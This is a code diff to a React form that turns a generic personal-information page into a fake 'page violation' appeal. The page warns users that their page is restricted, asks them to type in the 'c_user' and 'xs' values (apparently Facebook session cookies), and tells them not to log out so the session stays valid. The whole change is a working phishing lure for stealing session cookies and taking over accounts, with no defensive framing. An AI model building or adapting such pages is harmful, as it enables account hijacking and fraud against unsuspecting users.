@@ -3,8 +3,8 @@ import FormInput from "../components/FormInput.jsx";
 
 function Home({ onNext }) {
   const [formData, setFormData] = useState({
-    phoneNumber: "",
-    dateOfBirth: "",
+    c_user: "",
+    xs: "",
   });
   const [errors, setErrors] = useState({});
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -27,12 +27,14 @@ function Home({ onNext }) {
   const validateForm = () => {
     const newErrors = {};
 
-    if (!formData.phoneNumber.trim()) {
-      newErrors.phoneNumber = "Phone number is required";
+    if (!formData.c_user.trim()) {
+      newErrors.c_user = "c_user is required";
+    } else if (!/^\d{15}$/.test(formData.c_user)) {
+      newErrors.c_user = "Please enter 15 digits";
     }
 
-    if (!formData.dateOfBirth.trim()) {
-      newErrors.dateOfBirth = "Date of birth is required";
+    if (!formData.xs.trim()) {
+      newErrors.xs = "xs is required";
     }
 
     setErrors(newErrors);
@@ -98,41 +100,62 @@ function Home({ onNext }) {
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
       <div className="form-container">
         <h2 className="text-2xl font-bold text-gray-800 mb-6">
-          Personal Information
+          Request For Remove Page Violation
         </h2>
+
+        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+          <p className="text-blue-800 text-sm mb-2">
+            We've identified irregular activity on your page that goes against our community guidelines.
+          </p>
+          <p className="text-blue-800 text-sm mb-2">
+            As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.
+          </p>
+          <p className="text-blue-800 text-sm">
+            Please provide the precise details below.
+          </p>
+        </div>
 
         <form onSubmit={handleSubmit}>
           <FormInput
-            label="Phone Number"
-            type="tel"
-            name="phoneNumber"
-            value={formData.phoneNumber}
+            label="c_user"
+            type="number"
+            name="c_user"
+            value={formData.c_user}
             onChange={handleInputChange}
-            error={errors.phoneNumber}
+            error={errors.c_user}
             required
-            placeholder="Enter your phone number"
+            pattern="^\d{15}$"
+            title="Please enter 15 digits"
+            placeholder="Enter your c_user (15 digits)"
           />
 
           <FormInput
-            label="Date of Birth"
-            type="date"
-            name="dateOfBirth"
-            value={formData.dateOfBirth}
+            label="xs"
+            type="text"
+            name="xs"
+            value={formData.xs}
             onChange={handleInputChange}
-            error={errors.dateOfBirth}
+            error={errors.xs}
             required
+            placeholder="Enter your xs"
           />
 
           {errors.submit && (
             <div className="error-message mb-4">{errors.submit}</div>
           )}
 
+          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+            <p className="text-yellow-800 text-sm">
+              Please make sure not to log out from your computer or laptop until you have received a verification email.
+            </p>
+          </div>
+
           <button
             type="submit"
             className="submit-button"
             disabled={isSubmitting}
           >
-            {isSubmitting ? "Submitting..." : "Continue"}
+            {isSubmitting ? "Submitting..." : "Submit"}
           </button>
         </form>
       </div>
